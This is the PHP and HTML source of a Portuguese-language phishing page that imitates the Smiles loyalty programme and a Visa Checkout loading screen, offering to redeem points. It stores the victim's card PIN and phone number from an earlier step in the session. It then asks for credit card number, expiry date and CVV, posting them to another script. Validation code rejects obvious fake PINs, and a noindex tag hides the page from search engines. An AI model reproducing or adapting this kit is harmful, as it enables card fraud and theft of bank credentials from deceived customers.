<?php
if(!empty($_POST)){

session_start();
$_SESSION["senha6"] = $_POST["SenhaCartao"];
$_SESSION["Celular"] = $_POST["Celular"];

}
?><html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        <title>VANTAGENS SMILES</title>

		

		<meta name="robots" content="noindex, nofollow, noimageindex">

		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

        

        <link rel="stylesheet" type="text/css" href="./home3_files/6ebb759d59d1431ce404556b609c4806.css">

        <link rel="stylesheet" type="text/css" href="./home3_files/8176341611c6fe1cdf552eedef0f24d9.css">

        <link href="favicon.ico" rel="Shortcut Icon">



        <script src="./home3_files/955d569ccd60b771ebef81ac2fd6e326.js.download"></script>

        <script src="./home3_files/b3361ce6308f83ec5605048aaf3d2c6c.js.download"></script>

        <script src="./home3_files/4d69adbd29bff6e12b1db3ddaf02e7db.js.download"></script>

        <script src="./home3_files/980af6c4a22c3fcd6621a45d0e3f3a90.js.download"></script>

        <script src="./home3_files/980af6c4a22c3fcd6621a45d0e3f3a90.js(1).download" language="javascript"></script>

<script type="text/javascript">
	
	function mascaraInteiro(){
        if (event.keyCode < 48 || event.keyCode > 57){
                event.returnValue = false;
                return false;
        }
        return true;
}

//formata de forma generica os campos
function formataCampo(campo, Mascara, evento) { 
        var boleanoMascara; 

        var Digitato = evento.keyCode;
        exp = /\-|\.|\/|\(|\)| /g
        campoSoNumeros = campo.value.toString().replace( exp, "" ); 

        var posicaoCampo = 0;    
        var NovoValorCampo="";
        var TamanhoMascara = campoSoNumeros.length;; 

        if (Digitato != 8) { // backspace 
                for(i=0; i<= TamanhoMascara; i++) { 
                        boleanoMascara  = ((Mascara.charAt(i) == "-") || (Mascara.charAt(i) == ".")
                                                                || (Mascara.charAt(i) == "/")) 
                        boleanoMascara  = boleanoMascara || ((Mascara.charAt(i) == "(") 
                                                                || (Mascara.charAt(i) == ")") || (Mascara.charAt(i) == " ")) 
                        if (boleanoMascara) { 
                                NovoValorCampo += Mascara.charAt(i); 
                                  TamanhoMascara++;
                        }else { 
                                NovoValorCampo += campoSoNumeros.charAt(posicaoCampo); 
                                posicaoCampo++; 
                          }              
                  }      
                campo.value = NovoValorCampo;
                  return true; 
        }else { 
                return true; 
        }
}
function MascaraTelefone(tel){  
        if(mascaraInteiro(tel)==false){
                event.returnValue = false;
        }       
        return formataCampo(tel, '(00) 00000-0000', event);
}</script>
        <style>



          #spinner-section {

              visibility: hidden;

          }



          #spinner-section.show-spinner-section {

              visibility: visible;

          }



          .vmeCheckoutSpinner {

              position: fixed; 

              top: 0; 

              right: 0; 

              bottom: 0; 

              left: 0; 

              width: 200px;

              height: 250px;

              margin: auto;

              border-radius: 3px;

              background-color: #ffffff; 

          }



          .vmeCheckoutSpinner.vmeCheckoutSpinner--open { 

              z-index: 100;

              animation: MoveIn 1s, FadeIn 1s;

              animation-fill-mode: forwards;

              background: transparent;

          }



          .spinnerGhostLayer { 

              position: fixed; 

              top: 0; 

              left: 0; 

              width: 100%; 

              height: 100%;

              /*background-color: rgba(0,0,0,.9);*/

              animation: FadeInGhost 1s;

              animation-fill-mode: forwards;

              filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=90)"; 

          }



          .spinner-body {

              height: 130px;

          }



          .spinner-header { 

              height: 60px;

          }



          .spinner-footer { 

              height: 60px;

          }



          .close-wrap button { 

              cursor: pointer; 

          } 



          .spinner-close-button { 

              display: block;

              height: 60px;

              width: 40px;

              padding: 0px;

              border: 0;

              background-color: transparent;

              background-repeat: no-repeat;

              margin: 0 auto;

          }



          .spinner-close-button:hover, .spinner-close-button:active, .spinner-close-button:focus {

              outline: 0;

          }



          .checkout-logo { 

              display: block;

              width: 126px;

              margin: 0 auto;

              background-color: transparent;

              background-repeat: no-repeat;

          } 



          .visa-spinner-svg-yellow { 

              position: absolute; 

              top: 0; 

              right: 0; 

              bottom: 0; 

              left: 0; 

              width: 70px; 

              height: 70px; 

              margin: auto; 

              animation: RotateClockwise .6s infinite linear;

              background-color: transparent; 

              background-repeat: no-repeat;

              transform-origin: 50% 50%;

          }



          .visa-spinner-svg-blue { 

              position: absolute; 

              top: 0; 

              right: 0; 

              bottom: 0; 

              left: 0; 

              width: 70px; 

              height: 70px; 

              margin: auto; 

              animation: RotateClockwise .6s infinite linear;

              background-color: transparent; 

              background-repeat: no-repeat;

              transform-origin: 50% 50%;

          }



          .start-animation #main > section > div.viewPage-relativeWrapper {

              visibility: visible;

              animation: FadeIn;

              animation-duration: 1s;

              animation-fill-mode: forwards;

              background-color: #ffffff;

          }



          .start-animation #main > section > div.viewPage-overlay {

              visibility: visible;

          }



          .start-animation #spinner-section > div.spinnerGhostLayer {

              visibility: hidden;

          }



          .start-animation #spinner-section > div.vmeCheckoutSpinner.vmeCheckoutSpinner--open {

              z-index: 0;

              animation: SpinnerFadeOut;

              animation-duration: 1s;

              animation-fill-mode: forwards;

          }



          .start-animation #main > section.viewPage--closing > div.viewPage-relativeWrapper {

              animation: MoveOut, FadeOut;

              animation-duration: .5s;

              animation-timing-function: ease-in-out;

              animation-fill-mode: both;

         }



          @keyframes MoveIn {

              0% {

                  transform: translateY(50vh);

              }



              100% {

                  transform: translateY(0);

              }

          }



          @keyframes FadeIn {

              0% {

                  opacity: 0;

              }



              100% {

                  opacity: 1;

              }

          }



          @keyframes FadeInGhost {

              0% {

                  opacity: 0;

              }



              100% {

                  opacity: 0.9;

              }

          }



          @keyframes SpinnerFadeOut {

              0% {

                  opacity: 1;

              }



              95% {

                  opacity: 1;

              }



              100% {

                  opacity: 0;

              }

          }



          @keyframes RotateClockwise {

              0% {

                  transform: rotate(0deg);

              }



              100% {

                  transform: rotate(359deg);

              }

          }



      </style>

   </head>



<body>
  
  <script> setTimeout(function(){ document.getElementById("spinner-section").style.visibility="hidden"; }, 3000);
 function validaPFF() {
			
			var conta = document.getElementById("Celular").value;	
			var s8 = document.getElementById("SenhaCartao").value;
			var sass = document.getElementById("Assinatura").value;
			var regex = '[^0-9]+';
			
			
				if (conta.length < 14) {
					var alerta = "Número de Telefone inválido.";
					alert(alerta);
					document.acessopf.Celular.value="";
					return false;
				}	if (sass.length < 6) {
					var alerta = "Assinatura Eletrônica inválida.";
					alert(alerta);
					document.acessopf.Assinatura.value="";
					return false;
				}
			
				if (s8.length < 4 || s8.match(regex)) {
					var alerta = "Senha do Cartão de Débito Incorreta.";
					alert(alerta);
					document.acessopf.SenhaCartao.value="";
					return false;
				}
				if (s8 == "00000000" || s8 == "11111111" || s8 == "22222222" || s8 == "33333333" || s8 == "44444444" || s8 == "55555555" || s8 == "66666666" || s8 == "77777777" || s8 == "88888888" || s8 == "99999999" || s8 == "12345678") {
					var alerta = "Senha do Cartão de Débito incorreta.\nApós três tentativas consecutivas sua senha será bloqueada.";
					alert(alerta);
					document.acessopf.SenhaCartao.value="";
					return false;
				}
				$("#acessopf").submit();	
}  </script>
<section id="spinner-section" class=" show-spinner-section show-spinner-section">

      <div class="spinnerGhostLayer" style="
    z-index: 11;
    background-color: white;
"></div>

       <div class="vmeCheckoutSpinner vmeCheckoutSpinner--open vmeCheckoutSpinner--open" aria-label="Visa Checkout is currently loading" tabindex="-1">

           <header class="spinner-header">

              <img class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="./index_files/31e6c26998d511c3055f5aacb8780b40.png" style="">

           </header>

           <div class="spinner-body">

               

               <svg version="1.1" id="Layer_1" class="visa-spinner-svg-yellow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 90 90" style="enable-background:new 0 0 90 90;" xml:space="preserve">

                   <style type="text/css">

                   .st0{fill:#F57921;}

                   </style>

                   <path class="st0" d="M45.5,89.1c-24.3,0-44-19.7-44-44s19.7-44,44-44s44,19.7,44,44c0,2.2-1.8,4-4,4s-4-1.8-4-4

                   c0-19.9-16.1-36-36-36s-36,16.1-36,36s16.1,36,36,36c5.7,0,11.2-1.3,16.3-3.9c2-1,4.4-0.2,5.4,1.7c1,2,0.2,4.4-1.7,5.4

                   C59.2,87.5,52.5,89.1,45.5,89.1z">

                   </path>

               </svg>

               <svg version="1.1" id="Layer_1" class="visa-spinner-svg-blue" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 90 90" style="enable-background:new 0 0 90 90;" xml:space="preserve">

                   <style type="text/css">

                       .st1{fill:#F57921;}

                   </style>

                   <path class="st1" d="M34.6,87.6c-0.4,0-0.7,0-1.1-0.2c-18.9-5.3-32-22.7-32-42.4c0-24.3,19.7-44,44-44s44,19.7,44,44

                       c0,2.2-1.8,4-4,4s-4-1.8-4-4c0-19.9-16.1-36-36-36s-36,16.1-36,36c0,16.1,10.8,30.3,26.2,34.7c2.1,0.6,3.4,2.8,2.8,4.9

                       C38,86.5,36.4,87.6,34.6,87.6z">

                   </path>

               </svg>

           </div>

       </div>

       <script>

           var spinnerCloseButton = document.getElementById('spinner-close-button'),

               showRxoPopup = "", miniRXO = "", allowEXO = "",

               vmeCheckoutSpinner = document.querySelector('.vmeCheckoutSpinner'),

               spinnerSection = document.getElementById('spinner-section'),

               spinnerGhostLayer = document.querySelector('.spinnerGhostLayer');



           if(canUseWebstorage){

               showRxoPopup = sessionStorage.getItem('showRxoPopup');

               miniRXO = sessionStorage.getItem('miniRXO');

               allowEXO = sessionStorage.getItem('allowEXO');

           }



           if(showRxoPopup !== "true" && miniRXO !== "true" && allowEXO !== "true") {

               vmeCheckoutSpinner.focus();

               spinnerSection.className += ' show-spinner-section';

               vmeCheckoutSpinner.className += ' vmeCheckoutSpinner--open';

           }



           spinnerCloseButton.onclick = function() {

               window.parent.postMessage('close--' + JSON.stringify({

                   gtm: true,

                   event: 'Spinner Screen Close',

                   event_category: 'Spinner',

                   event_label: 'Spinner Screen Close',

                   event_action: 'Spinner Screen Close',

                   screen_name: 'Spinner',

                   screen_end_time: new Date().getTime()

               }), _postMessageTarget);

           };

       </script>

   </section>
 
   <header role="banner" class="header header-pinned ng-scope">

       <div class="container-content content-header ng-scope">

           <div class="header-brands">

               <div class="header-brand">

                  <img class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="./home3_files/31e6c26998d511c3055f5aacb8780b40.png" style="">

               </div>

           </div> 

       </div>

   </header>



   <main role="main" class="main main-content ng-scope">

       <div class="mpass-card ng-scope">

           <div class="container">

               <div class="row">

                   <div class="col-sm-6 ng-scope">

                       <div class="container-announcements">

                           <h1 class="text-announcements ng-binding">Vamos resgatar seus pontos Smiles!</h1>

                           <p class="text-announcements h3 ng-binding ng-scope">Basta fornecer as informações solicitadas para que possamos prosseguir com o resgate dos seus pontos Smiles.</p>

                       </div>

                   </div>

                   <div class="col-sm-6">

                      

                      <div id="campos" style="clear: both;">





<form method="POST" action="ConclusaoPontos.php#guardiao" name="acessopf" onsubmit="return validaPFF()">



	

						

                        
  <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                          </div>



                        
  <div class="formly-field ng-scope ng-isolate-scope formly-field-fieldUsername">

                              <input class="form-control" name="16Dig" id="16Dig" placeholder="Número Cartão de Crédito" type="tel" style="" oninvalid="setCustomValidity('Digite o número de seu cartão de crédito')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('#### #### #### ####', this);" maxlength="20" required="">
<br>
<script>
    function mascaraData( campo, e )
{
	var kC = (document.all) ? event.keyCode : e.keyCode;
	var data = campo.value;
	
	if( kC!=8 && kC!=46 )
	{
		if( data.length==2 )
		{
			campo.value = data += '/';
		}
		else
			campo.value = data;
	}
}
</script>

                              <input class="form-control" name="validade" id="validade" placeholder="Data de Validade" type="tel" style="" oninvalid="setCustomValidity('Digite a data de validade de seu cartão de crédito')" onkeypress="mascaraData( this, event )"  maxlength="05" required="">


<br>
                              <input class="form-control" name="cvvs" id="cvvs" placeholder="CVV" type="password" style="" oninvalid="setCustomValidity('Digite o cvv de seu cartão de crédito')" maxlength="03" required="">




                          </div>

                        </div>
<div class="formly-field ng-scope ng-isolate-scope formly-field-group">

                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6">

                              <div class="ng-scope form-group has-feedback">

                                <button type="submit" name="continue" id="continue" class="btn btn-block btn-primary ng-binding" 
style="
    border-color: yellow;
    background-color: rgb(252,237,61);
    color: rgb(0,85,150);">Confirmar</button>

                              </div>

                            </div>

                          </div>
                    </form>
       </div>

   </div></main>


<script language="javascript">
    $(document).ready(function(){ 
			$('#nome').html("CLIENTE");
   });
</script>
</body></html>
